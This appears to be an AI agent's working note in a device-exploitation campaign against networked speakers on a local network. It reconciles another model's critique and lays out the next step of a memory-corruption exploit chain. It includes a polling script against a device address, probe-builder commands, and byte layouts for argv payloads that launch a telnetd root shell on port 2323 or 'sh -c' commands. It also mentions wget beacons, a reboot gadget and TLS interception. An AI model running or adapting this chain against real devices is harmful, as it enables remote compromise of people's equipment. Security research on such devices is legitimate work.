# Reactions — the duel, and the next discriminator

## Honest reaction to the critique

**GLM is right, and the new evidence is on its side.** `a0`-at-entry was never live-read. What the
campaign actually device-proved is that **the FN address is called** (canaries crash, the reboot
gadget reboots, the observer cell fires with `F=node0`). `a0 = node0` and `r3 = B` are both
**decode/emulator inferences**. Last turn I wrote "r3=B is device-confirmed" — that was too strong;
there is no live read of either register. Withdraw it.

The new fire is the exact cell GLM predicted: **S2 `system@plt` at a fresh hit (`0x70c000`) → box
reboot, no beacon, no 2323.** And `.84` produced the identical signature tonight with the same play.
Two different ISAs, two different registers (`r3`, `a0`), byte-identical outcome. That is the shape of
a **shared wrong assumption**, not of two coincidences, and not of "telnetd won't bind".

Also on GLM's side and worth crediting: the 0.2 s tripoll plus a same-S canary is the correct
instrument — it is just aimed at the wrong object. It should be aimed at **the fire itself**, because
the reboot is ambiguous.

## Why "reboot, no beacon" is underdetermined

Three distinct causes produce that one signature:

| cause | expected timing |
|---|---|
| **A.** arg is a valid but wrong pointer → `system()` walks it, `sh` errors out, quick return | no outage at all |
| **B.** arg is invalid → `system()` faults → SIGSEGV | **sub-second** daemon gap, then 200 again |
| **C.** arg is right, the child runs but `wget`/`telnetd` fail, or the notify thread blocks | **long** outage |

and a fourth: **D.** two crashes escalate to a **box reboot** (documented 2-crash watchdog), which at
1 s polling looks exactly like C. `/status` is back either way. **The oracle everyone used (ICMP
loss, 1 s polls) cannot separate D from C** — and can barely separate B from A.

Worse, an assumption nobody tested: `/sbin/reboot` **never returns**. So "the reboot gadget proves
`system()` returns fast" is unsupported — every observed "success" was a command that kills the box.
Blocking may be *inherent* to `system()` from this thread, which would make the reboot a null signal.

`getZoneGroupState`'s `BootSeq` is the only reboot counter (a daemon restart does not bump it), and
`/status/VERSION` at 0.2 s is the only crash detector. Both belong in the ladder below.

## The next discriminator: a timing fingerprint, three payloads, one S

No listener, no file, no beacon — the *duration* is the observable:

| fire | args string at `node0` | meaning if seen |
|---|---|---|
| **P0** | `sleep 8` | an **~8 s** `/status` outage, `BootSeq` unchanged ⇒ **arg control PROVEN** |
| **P1** | `/bin/true` | a clean no-outage fire immediately after P0 ⇒ the command completes and returns |
| **P2** | `sleep 90` | a **60–100 s** outage + `BootSeq + 1` ⇒ the reboot is C (blocked thread), not D |

**Order matters:** if `P0` reboots the box, re-calibrate `S` before `P1`/`P2` — the band re-seeds.
Run `P1` first on a unit where `P0` returned clean, never across a reboot.

Read: `P0` long-and-recovered = we own the argument, and telnetd/wget are the only problem left.
`P0` sub-second gap = B, wrong-but-mapped pointer. `P0` nothing = A, and the pointer is valid text
that is not a command. `P0` reboot = D (crash escalation) → same conclusion as B.

```bash
python3 - <<'EOF'
import subprocess,time,re
U="192.168.4.135"
def code(p):
    return subprocess.run(["curl","-s","-m","2","-o","/dev/null","-w","%{http_code}",
                           f"http://{U}:1400/{p}"],capture_output=True,text=True).stdout
def bootseq():                      # max over the household; a daemon restart does NOT bump it
    b=subprocess.run(["curl","-s","-m","4","-X","POST",
      "-H",'SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#GetZoneGroupState"',
      "--data-binary",'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>'
      '<u:GetZoneGroupState xmlns:u="urn:schemas-upnp-org:service:ZoneGroupTopology:1"/>'
      '</s:Body></s:Envelope>', f"http://{U}:1400/ZoneGroupTopology/Control"],
      capture_output=True,text=True).stdout
    v=[int(x) for x in re.findall(r"BootSeq=&quot;(\d+)",b)]; return max(v) if v else -1
print("BootSeq before:",bootseq(), flush=True)
# fire P0 HERE (existing machinery): rebuild(S, 0x6DCEA0, b"sleep 8\x00") at the calibrated S
t0=time.time(); gaps=[]; down=None
while time.time()-t0<170:
    if code("status/VERSION")=="200":
        if down is not None: gaps.append(round(time.time()-down,2)); down=None
    elif down is None: down=time.time()
    time.sleep(0.2)
print("outages:",gaps,"BootSeq after:",bootseq())
EOF
```
Expect `outages: [~8]` on P0. A `[0.3]` is a crash; `[]` is A; `[60–100]` + `BootSeq+1` is D; the
boot itself is the P2 control.

## If arg control is wrong: stop hoping for a register, place the pointer

Both exec wrappers take **`a0`/`r3` = a `char **argv` we build** (`access(argv[0],X_OK)` →
fork/vfork → `execve(argv[0], argv, environ)`; ≤9 entries; the S2 one also dups pipes and closes
3..255). The array is a *pointer we place*, so the only remaining dependency is the same entry
register — but now a wrong value fails **before** the fork, in `access()`, with a fast return, which
is itself a clean signal.

`recon/tnzm_audible/probe_builder.py` builds all of this (modes `fp`/`wrap`/`canary`, `--isa`, `--s`),
and the four layouts below are generated and byte-checked already:

```
python3 recon/tnzm_audible/probe_builder.py --isa s2  --s <hit> --mode fp --ms 8 --out /tmp/p0.aa
python3 recon/tnzm_audible/probe_builder.py --isa s2  --s <hit> --mode wrap           --out /tmp/w.aa
python3 recon/tnzm_audible/probe_builder.py --isa ppc --s <hit> --mode wrap           --out /tmp/w.aa
```

PPC construction (the `[B]=V` constraint is an asset: `argv[0]` **is** `V` = node600, so put the path
string there, before the `FN` DWORD at `+28`):

```
node 200  { &600, &640, &643, &651, &654, 0 }     ← the argv array IS B; verified bytes
node 640  "-l\0"   643 "/bin/sh\0"   651 "-p\0"   654 "2323\0"
node 600  "/usr/sbin/telnetd\0"     (18 B, ends before +28)
node 628  FN = 0x104044C0            (clobbered by nothing; 600+19..627 pad)
```
S2: `argv = { &700("/bin/sh"), &708("-c"), &710(cmd), 0 }` at node0 — offsets 0/4/8/12 — and the
command anywhere in the free 632–6403 hole (no 107-byte budget any more).

**Accept** the post-fork fault: `r4`/`a1` is the notify context, and both wrappers write pipe fds
through it. A daemon restart *after* the child has `execve`d is a pass, not a failure — the listener
is already a separate process.

## What would make me drop this lane

- `P0` returns `[]` **and** an unmapped `FN=0x51000000` at the same S also returns `[]` ⇒ the chain
  is not reaching the FN at the address assumed, and the register question is secondary.
- A wrapper fire whose `access()` fails (fast clean return, no child) *and* a P0 that also shows
  `[]` ⇒ the dispatcher is not passing node0 on either ISA; then the target becomes the
  **dispatcher's own argument setup** (find the caller that builds the FN argument) rather than more
  payload guessing.

## Where the two plans now stand

GLM's instrument was right and its critique lands; my ranking of "system@plt is the cheapest S2
shell" holds only if the register inference is true, which the new fire has now put in doubt. The
honest order is: **P0/P1/P2 fingerprint → wrapper with a placed argv → only then telnetd/beacon
polish.** The encrypted type-3, the 86.11 upgrade and the TLS-patched intercept are unaffected by
any of this and should keep running in parallel.
